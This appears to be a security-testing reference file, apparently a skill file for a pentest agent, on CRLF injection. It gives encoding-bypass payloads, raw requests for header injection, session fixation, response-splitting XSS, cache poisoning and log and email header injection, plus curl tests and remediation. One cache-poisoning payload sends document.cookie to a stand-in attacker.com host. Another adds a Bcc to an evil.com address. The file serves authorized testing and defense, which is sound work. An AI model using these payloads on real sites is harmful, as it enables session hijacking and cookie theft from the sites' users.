---
name: crlf-injection
description: CRLF injection testing covering HTTP header injection, response splitting, log poisoning, and cache poisoning techniques
---

# CRLF Injection

CRLF injection exploits the carriage return (`\r`) and line feed (`\n`) characters that delimit HTTP headers and log entries. When user input is embedded into HTTP response headers or log files without sanitizing these characters, attackers can inject arbitrary headers, split HTTP responses, poison caches, fixate sessions, and pivot to XSS.

## Attack Surface

**Types**
- HTTP header injection (injecting new headers into responses)
- HTTP response splitting (injecting a full second response)
- Log injection/forging (injecting fake log entries)
- Email header injection (injecting CC/BCC/Subject headers)

**Contexts**
- Redirect endpoints (`Location` header), `Set-Cookie` construction, custom response headers built from user input, logging frameworks, email sending functions

**Injection Points**
- URL redirect parameters (`redirect=`, `url=`, `next=`, `return=`)
- Values reflected in `Set-Cookie` headers
- Custom headers built from user-controlled data
- Log messages incorporating request parameters, User-Agent, Referer

**Defenses to Bypass**
- URL encoding filters, newline stripping, WAF rules, framework auto-sanitization

## Payloads

### Basic CRLF Sequences

```
%0d%0a           (URL-encoded \r\n)
%0D%0A           (uppercase URL-encoded)
%0d%0a%0d%0a     (double CRLF — ends headers, starts body)
\r\n             (literal, in some contexts)
%E5%98%8A%E5%98%8D  (Unicode \u560a\u560d — normalized to \r\n in some parsers)
%c0%8d%c0%8a     (overlong UTF-8 encoding)
```

### Encoding Variations

```
%0d%0a                    Standard
%250d%250a                Double URL-encoded
%%0d0d%%0a0a              Nested encoding
%0d%20%0a                 CR-space-LF (some parsers accept)
%0d%0a%09                 CRLF-tab (header folding in older HTTP/1.0)
\n (LF-only)              Works on some Unix-based servers
```

## Key Vulnerabilities

### HTTP Header Injection

Inject new response headers via a redirect parameter:
```
GET /redirect?url=https://target.com%0d%0aSet-Cookie:admin=true%0d%0a HTTP/1.1
```
Response:
```http
HTTP/1.1 302 Found
Location: https://target.com
Set-Cookie: admin=true
```

### Session Fixation via Header Injection

```
GET /redirect?url=/%0d%0aSet-Cookie:session=attacker_controlled_value;Path=/;HttpOnly HTTP/1.1
```

### XSS via Response Splitting

Inject a complete second response with HTML body:
```
GET /redirect?url=/%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:25%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
```

### Cache Poisoning

If a CDN or proxy caches the split response, all subsequent users requesting the same URL receive the attacker-controlled content:
```
GET /redirect?url=/%0d%0a%0d%0a<html><script>document.location='https://attacker.com/?c='+document.cookie</script></html> HTTP/1.1
Host: target.com
```
The second response is cached by the CDN for the requested URL.

### Log Injection

Inject fake log entries to obscure attacks or frame other users:
```
GET /page?user=admin%0d%0a[2026-03-26 12:00:00] INFO: Login successful for user=attacker from 10.0.0.1 HTTP/1.1
```
Log file shows:
```
[2026-03-26 12:00:00] INFO: Request from user=admin
[2026-03-26 12:00:00] INFO: Login successful for user=attacker from 10.0.0.1
```

### Email Header Injection

When user input reaches email headers:
```
POST /contact
name=victim%0d%0aBcc:attacker@evil.com%0d%0a&message=hello
```

## Testing Methodology

1. **Identify reflection points** — find parameters reflected in response headers (Location, Set-Cookie, custom headers)
2. **Inject basic CRLF** — try `%0d%0a` in each parameter and inspect raw response headers
3. **Test encoding variants** — double encoding, Unicode, overlong UTF-8 if basic payloads are stripped
4. **Inject new headers** — attempt to add `Set-Cookie`, `X-Custom`, or `Content-Type` headers
5. **Attempt response splitting** — inject double CRLF to start a response body
6. **Check log injection** — if parameters appear in logs, inject fake log entries
7. **Assess caching** — determine if responses are cached and test cache poisoning impact

**curl Testing:**
```bash
# Test header injection in redirect
curl -v "https://target.com/redirect?url=/%0d%0aX-Injected:true"

# Test with double encoding
curl -v "https://target.com/redirect?url=/%250d%250aX-Injected:true"

# Check if LF alone works
curl -v "https://target.com/redirect?url=/%0aX-Injected:true"

# Test Set-Cookie injection
curl -v "https://target.com/redirect?url=/%0d%0aSet-Cookie:pwned=1"
```

## Indicators of Vulnerability

- New headers appear in the HTTP response after injecting `%0d%0a`
- Response body contains attacker-controlled content after double CRLF injection
- Log files show entries that were injected via request parameters
- Different encoding variants bypass initial filters but still inject newlines
- Framework or server does not strip CR/LF from header values

## Remediation

- Strip or reject `\r` and `\n` (and their encoded forms) from any input used in HTTP headers
- Use framework-provided header-setting APIs that encode or reject newlines (most modern frameworks do this by default)
- URL-encode the entire value when constructing `Location` headers from user input
- Validate redirect URLs against an allowlist; never pass raw user input into headers
- For logging, sanitize or encode control characters before writing to log files
- Use structured logging (JSON format) to prevent log injection
- Configure CDN/proxy to not cache responses with unexpected headers or split indicators

## False Positives

- Framework automatically strips CRLF from header values (verify in raw response, not browser devtools)
- URL encoding in Location header makes injected characters literal (e.g., `%250d%250a` stays encoded)
- Server responds with 400 Bad Request when CRLF is detected (active protection)

## Summary

CRLF injection turns newline characters into header and response delimiters. Any user input reflected in HTTP headers or log files without newline sanitization is a potential vector. Test redirect parameters, cookie values, and custom headers with `%0d%0a` variants. Impact ranges from session fixation to cached XSS via response splitting.
